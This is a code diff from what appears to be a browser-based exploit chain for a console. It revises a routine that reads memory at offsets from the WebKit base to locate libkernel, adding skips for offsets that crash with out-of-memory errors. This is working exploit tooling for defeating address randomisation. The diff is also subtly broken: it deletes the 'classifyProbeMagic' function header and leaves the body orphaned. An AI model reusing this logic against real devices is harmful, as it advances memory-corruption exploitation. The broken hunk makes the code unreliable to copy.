@@ -2222,7 +2222,8 @@ function microStubScore(p, base) {
     return stubs;
 }
 
-function classifyProbeMagic(w, addr, webkitBase, off) {
+/** Poops HW: wk-1800000 read OOMs even when neighboring probes map. */
+const LK_HUNT_TOXIC_DELTAS = new Set([0x1800000]);
     if (w == null) return "UNMAPPED";
     if (webkitBase && isSameWebkitModule(addr, webkitBase, off)) return "webkit";
     if (w === SCE_MAGIC) return "SCE";
@@ -2241,12 +2242,22 @@ export function huntLibkernelCandidatesChunk(p, webkitBase, off, state, opts) {
     if (!state) {
         const wb = ptrBig(webkitBase) & ~0x3fffn;
         const deltas = [
-            0x400000, 0x800000, 0x1000000, 0x1800000,
+            0x400000, 0x800000, 0x1000000, 0x1400000,
             0x2000000, 0x2800000, 0x3000000, 0x3800000,
         ];
         const addrs = [];
-        for (let i = 0; i < deltas.length; i++)
-            addrs.push({ hex: "0x" + (wb - BigInt(deltas[i])).toString(16), why: "wk-" + deltas[i].toString(16) });
+        for (let i = 0; i < deltas.length; i++) {
+            const d = deltas[i];
+            const entry = {
+                hex: "0x" + (wb - BigInt(d)).toString(16),
+                why: "wk-" + d.toString(16),
+            };
+            if (LK_HUNT_TOXIC_DELTAS.has(d)) {
+                entry.skip = true;
+                entry.skipWhy = "TOXIC-OOM";
+            }
+            addrs.push(entry);
+        }
         state = { addrs, idx: 0, reads: 0, nulls: 0, nullRun: 0, log: [] };
         return { done: false, state, phase: "cand-start", total: addrs.length, readMax, wk: String(webkitBase) };
     }
@@ -2271,6 +2282,29 @@ export function huntLibkernelCandidatesChunk(p, webkitBase, off, state, opts) {
     const n = state.idx + 1;
     const total = state.addrs.length;
     state.idx++;
+
+    const probe = {
+        n: n,
+        total: total,
+        hex: c.hex,
+        why: c.why,
+        addr: c.hex,
+    };
+
+    if (c.skip) {
+        probe.magic = c.skipWhy || "SKIP";
+        probe.raw = "-";
+        state.log.push(probe);
+        return {
+            done: false,
+            state,
+            phase: "cand-skip-probe",
+            probe,
+            reads: state.reads,
+            log: state.log,
+        };
+    }
+
     state.reads++;
 
     let addr = null;
@@ -2279,14 +2313,7 @@ export function huntLibkernelCandidatesChunk(p, webkitBase, off, state, opts) {
     } catch (_) {
         addr = null;
     }
-
-    const probe = {
-        n: n,
-        total: total,
-        hex: c.hex,
-        why: c.why,
-        addr: addr ? String(addr) : "?",
-    };
+    probe.addr = addr ? String(addr) : "?";
 
     if (!addr) {
         probe.magic = "BAD-ADDR";
